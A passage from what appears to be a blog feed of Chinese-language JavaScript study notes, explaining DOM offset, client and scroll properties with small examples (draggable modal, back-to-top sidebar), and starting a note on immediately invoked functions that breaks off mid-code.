language_">console</span>.<span class="title function_">log</span>(son.<span class="property">offsetLeft</span>); <span class="comment">//if.father 没有定位 : 170  if.father 加上定位 :20 if.father 加上padding 40</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//2.可以得到元素的大小</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(father.<span class="property">offsetHeight</span>); <span class="comment">//240  包含padding+border+width</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//3.返回带有定位的父元素 or 返回body</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(son.<span class="property">offsetParent</span>); <span class="comment">//返回最近一级有定位的父亲</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(son.<span class="property">parentNode</span>); <span class="comment">//返回亲父亲</span></span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br></pre></td></tr></table></figure><h4 id="1.2-offset-与-style-区别">1.2 offset 与 style 区别<a title="#1.2-offset-与-style-区别" href="#1.2-offset-与-style-区别"></a></h4><p>offset：</p><ul><li>offset 可以得到任意样式表中的样式值</li><li>offset 系列获得的数值是没有单位的</li><li>offsetWidth 包含padding + border + width</li><li>offsetWidth 等属性是只读属性，只能获取不能赋值</li><li><font color='red'>所以，我们想要获取元素大小位置，用 offset 更合适</font></li></ul><p>style：</p><ul><li>style 只能得到行内样式表中的样式值</li><li>style.width 获得的是带有单位的字符串</li><li>style.width 获得不包含 padding 和border 的值</li><li>style.width 是可读写属性，可以获取也可以赋值</li><li><font color='red'>所以，我们想要给元素更改值，则需要用style</font></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.box</span>&#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">width</span>:<span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">height</span>:<span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&#x27;box&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">let</span> box = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.box&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(box.<span class="property">offsetWidth</span>); <span class="comment">//200</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(box.<span class="property">style</span>.<span class="property">width</span>); <span class="comment">//若无行内 则不输出 if .box加上 style=&#x27;width：200px&#x27;  200px</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//offsetwidth 赋值 对box/12行 输出 无影响</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//.style.width 就会改值</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="1.3--案例之获取鼠标相对于盒子的位置">1.3  案例之获取鼠标相对于盒子的位置<a title="#1.3--案例之获取鼠标相对于盒子的位置" href="#1.3--案例之获取鼠标相对于盒子的位置"></a></h4><blockquote><p>盒子在页面中的距离 box.offsetLeft box.offsetTop</p><p>鼠标在页面中的坐标 e.pageX e.pageY</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    * &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">margin</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">margin</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    </span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.box</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">width</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">margin</span>: <span class="number">50px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">background-color</span>: brown;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> box = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.box&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    box.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> x = e.<span class="property">pageX</span> - box.<span class="property">offsetLeft</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> y = e.<span class="property">pageY</span> - box.<span class="property">offsetTop</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(x, y);</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="1.4-案例之模态框的拖拽">1.4 案例之模态框的拖拽<a title="#1.4-案例之模态框的拖拽" href="#1.4-案例之模态框的拖拽"></a></h4><p>原理：鼠标按下并且移动，松开鼠标</p><p>事件：鼠标按下mousedown 鼠标移动mousemove 鼠标松开mouseup</p><p>过程：鼠标移动过程中，获得最新的值赋值给模态框的left和top值</p><p>模态框的位置：鼠标的坐标减去鼠标在盒子内的坐标</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    * &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">padding</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">margin</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    </span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">div</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">position</span>: relative;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">top</span>: <span class="number">50%</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">left</span>: <span class="number">50%</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">transform</span>: <span class="built_in">translate</span>(-<span class="number">50%</span>, <span class="number">50%</span>);</span></span><br><span class="line"><span class="language-css">        <span class="attribute">width</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">height</span>: <span class="number">150px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">background-color</span>: plum;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    </span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.hide</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">top</span>: <span class="number">0px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">right</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;show&quot;</span>&gt;</span>点击弹出<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;model&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;hide&quot;</span>&gt;</span>x<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> show = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.show&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> model = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.model&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> hide = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.hide&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    show.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        model.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;block&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    model.<span class="title function_">addEventListener</span>(<span class="string">&#x27;mousedown&#x27;</span>, <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//1.鼠标按下，获得鼠标在盒子内的坐标 —— 不变的</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> clickX = e.<span class="property">pageX</span> - model.<span class="property">offsetLeft</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> clickY = e.<span class="property">pageY</span> - model.<span class="property">offsetTop</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// console.log(clickX, clickY);</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//2.鼠标移动过程中，获得最新的值 变的长度-不变的长度 赋值给模态框的left和top值</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;mousemove&#x27;</span>, move);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">move</span>(<span class="params">ec</span>) &#123;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            model.<span class="property">style</span>.<span class="property">left</span> = ec.<span class="property">pageX</span> - clickX + <span class="string">&#x27;px&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">            model.<span class="property">style</span>.<span class="property">top</span> = ec.<span class="property">pageY</span> - clickY + <span class="string">&#x27;px&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//3.鼠标弹起 移除鼠标移动事件</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;mouseup&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="title function_">removeEventListener</span>(<span class="string">&#x27;mousemove&#x27;</span>, move);</span></span><br><span class="line"><span class="language-javascript">        &#125;)</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    hide.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="property">arentNode</span>.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;none&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2.元素可视区client系列">2.元素可视区client系列<a title="#2.元素可视区client系列" href="#2.元素可视区client系列"></a></h3><p>client就是客户端的意思，我们使用client系列的相关属性来获取元素可视区的相关信息。通过client系列的相关属性可以动态的得到该元素的边框大小、元素大小等。</p><div class="φbq"><div class="φbs"><table><thead><tr><th>client系列属性</th><th>作用</th></tr></thead><tbody><tr><td>element.clientTop</td><td>返回元素上边框的大小</td></tr><tr><td>element.clientLeft</td><td>返回元素左边框的大小</td></tr><tr><td>element.clientWidth</td><td>返回自身包括padding、内容区的宽度、不包含边框，不带单位</td></tr><tr><td>element.clientHeight</td><td>返回自身包括padding、内容区的高度、不包含边框，不带单位</td></tr></tbody></table></div></div><h3 id="3.元素scroll系列">3.元素scroll系列<a title="#3.元素scroll系列" href="#3.元素scroll系列"></a></h3><h4 id="3.1元素scroll系列属性">3.1元素scroll系列属性<a title="#3.1元素scroll系列属性" href="#3.1元素scroll系列属性"></a></h4><p>scroll就是滚动的的意思，使用scroll系列相关属性可以动态得到该元素的大小、滚动距离等。</p><div class="φbq"><div class="φbs"><table><thead><tr><th>scroll系列属性</th><th>作用</th></tr></thead><tbody><tr><td>element.scrollTop</td><td>返回被卷去的上侧距离，不带单位</td></tr><tr><td>element.scrollLeft</td><td>返回被卷去的左侧距离，不带单位</td></tr><tr><td>element.scrollWidth</td><td>返回自身实际宽度 不含边框，不带单位</td></tr><tr><td>element.scrollHeight</td><td>返回自身实际高度，不含边框，不带单位</td></tr></tbody></table></div></div><blockquote><p>element.scrollWidth ：if内容超过宽度 则比宽度大，包含padding，可以说是实际内容的大小</p></blockquote><img src='https://s1.328888.xyz/2022/04/09/XnWs2.png' style="zoom:50%;" ><h4 id="3.2-页面被卷去的头部">3.2 页面被卷去的头部<a title="#3.2-页面被卷去的头部" href="#3.2-页面被卷去的头部"></a></h4><p>如果浏览器的高/宽度不足以显示整个页面时，会自动出现滚动条。当滚动条向下滚动时，页面上面被隐藏掉的高度，称为页面被卷去的头部。滚动条在滚动时会触发onscroll事件。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">div.<span class="title function_">addEventListener</span>(<span class="string">&#x27;scroll&#x27;</span>,<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(div.<span class="property">scrollTop</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h4 id="3.3-案例之返回顶部">3.3 案例之返回顶部<a title="#3.3-案例之返回顶部" href="#3.3-案例之返回顶部"></a></h4><ul><li>需要用到页面滚动事件scroll 因为是<font color='red'>页面滚动，所以事件源是document</font></li><li>滚动到某个位置，就是判断页面被卷去的上部值</li><li><font color='red'>页面被卷去的头部：可以通过window.pageYOffset获得</font> (如果是页面被卷曲的左侧 <font color='red'>window.pageXOfffset</font>)</li><li>注意，<font color='red'>元素</font>被卷去的头部是<font color='red'>element.scrollTop</font>，如果是<font color='red'>页面</font>被卷去的头部则是<font color='red'>window.pageYOffset</font></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;slider-bar&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;goBack&quot;</span>&gt;</span>返回顶部<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;header w&quot;</span>&gt;</span>头部区域<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;banner w&quot;</span>&gt;</span>banner区域<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;main w&quot;</span>&gt;</span>主体部分<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//1.获取元素</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> sliderbar = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.slider-bar&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> banner = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.banner&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//但我们侧边栏固定定位之后应该变化的值</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> tops = sliderbar.<span class="property">offsetTop</span> - banner.<span class="property">offsetTop</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//获取main 主体元素</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> main = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.main&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> goBack = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.goBack&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//2.页面滚动事件 scroll</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;scroll&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//3.当页面被卷去的头部   大于等于banner区域  侧边栏改为固定定位</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">pageYOffset</span> &gt;= banner.<span class="property">offsetTop</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                sliderbar.<span class="property">style</span>.<span class="property">position</span> = <span class="string">&#x27;fixed&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                sliderbar.<span class="property">style</span>.<span class="property">top</span> = tops + <span class="string">&#x27;px&#x27;</span>; <span class="comment">//tops 得再外面定义 不然值会变的</span></span></span><br><span class="line"><span class="language-javascript">            &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                sliderbar.<span class="property">style</span>.<span class="property">position</span> = <span class="string">&#x27;absolute&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                sliderbar.<span class="property">style</span>.<span class="property">top</span> = <span class="string">&#x27;300px&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//4.当页面滚动到main 盒子就显示goback模块</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">pageYOffset</span> &gt;= main.<span class="property">offsetTop</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                goBack.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;block&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">            &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                goBack.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;none&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="3.4-页面被卷去的头部兼容性解决方案">3.4 页面被卷去的头部兼容性解决方案<a title="#3.4-页面被卷去的头部兼容性解决方案" href="#3.4-页面被卷去的头部兼容性解决方案"></a></h4><p>因此被卷去的头部通常有如下几种写法：</p><ol><li><p>声明了DTD(<code>&lt;!DOCTYPE html&gt;</code>)，使用<code>document.documentElement.scrollTop</code></p></li><li><p>未声明DTD，使用<code>document.body.scrollTop</code></p></li><li><p>新方法<code>window.pageYOffset </code>和 <code>window.pageXOffset</code> ，IE9开始支持</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">getScroll</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span>&#123;</span><br><span class="line">        <span class="attr">left</span>:<span class="variable language_">window</span>.<span class="property">pageXOffset</span> || <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">scrollLeft</span> || <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">scrollLeft</span> || <span class="number">0</span>;</span><br><span class="line">        <span class="attr">top</span>:<span class="variable language_">window</span>.<span class="property">pageYOffset</span> || <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">scrollTop</span> || <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">scrollTop</span> || <span class="number">0</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用时 getScroll().left</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="三大系列总结">三大系列总结<a title="#三大系列总结" href="#三大系列总结"></a></h3><div class="φbq"><div class="φbs"><table><thead><tr><th>三大系列大小对比</th><th>作用</th></tr></thead><tbody><tr><td>element.offsetWidth</td><td>返回自身+padding+边框，内容区的宽度</td></tr><tr><td>element.clientWidth</td><td>返回自身+padding，内容区的宽度</td></tr><tr><td>element.scrollWidth</td><td>返回自身实际宽度，+padding</td></tr></tbody></table></div></div><img src='https://s1.328888.xyz/2022/04/09/XnzVM.png'><h4 id="主要用法：">主要用法：<a title="#主要用法：" href="#主要用法："></a></h4><ol><li>offset 系列：获取元素的位置 <font color='red'>offsetLeft   offsetTop</font></li><li>client 系列：获取元素大小  <font color='red'>clientWidth   clientHeight</font></li><li>scroll系列：获取滚动距离  <font color='red'>scrollTop   scrollLeft</font></li><li><font color='red'>页面的滚动距离</font>通过 <font color='red'>window.pageXOffset</font> 获得</li></ol>]]></content>
      
      
      <categories>
          
          <category> learningNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>立即执行函数</title>
      <link href="/learningNotes/js/%E7%AB%8B%E5%8D%B3%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"/>
      <url>/learningNotes/js/%E7%AB%8B%E5%8D%B3%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0</url>
      
        <content type="html"><![CDATA[<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//普通函数 写完函数 + 调用</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">fn</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//1.立即执行函数：不需要调用 马上执行</span></span><br><span class="line"><span class="comment">//2.写法：</span></span><br><span class="line"><span class="comment">// (function()&#123;&#125;)()  /  (function()&#123;&#125;());</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//第二个小括号 相当于 调用的作用</span></span><br><span class="line">(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>)</span><br><span class="line">&#125;)();  </span><br><span class="line"><span class="comment">//if有多个立即执行函数 要用分号隔开</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//第二个小括号 也可以传参</span></span><br><span class="line">(<span class="keyword">function</span>(<span class="params">a</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(a);</span><br><span class="line">&#125;)(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//也可以非匿名函数</span></span><br><span class="line">(<span class="keyword">function</span> <span class="title function_">sum</span>(<span class="params">a, b</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(a 